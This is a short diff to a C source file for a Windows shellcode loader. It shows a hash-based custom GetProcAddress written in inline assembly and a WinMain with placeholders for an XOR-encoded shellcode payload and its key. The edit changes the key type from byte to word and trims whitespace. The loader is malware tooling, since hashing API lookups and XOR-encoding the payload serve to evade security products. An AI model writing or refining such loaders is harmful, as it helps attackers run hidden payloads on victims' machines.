@@ -175,7 +175,7 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
             : [hash] "r" (function_hash), [module] "r" ((uintptr_t)hModule)                // Input
             : "rax", "rbx", "rdx", "rsi", "rcx", "r8", "r9", "r10", "memory"  // Clobbers
         );
-        
+
     #else
         // 32-bit code TODO
     #endif
@@ -187,7 +187,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     unsigned char payload[] = "%SHELLCODE%";
     SIZE_T regionSize = sizeof(payload);
-    BYTE key = %XOR_KEY%;
+    WORD key = %XOR_KEY%;
     PVOID exec = NULL;
     DWORD old_protect = 0;
     HANDLE th;
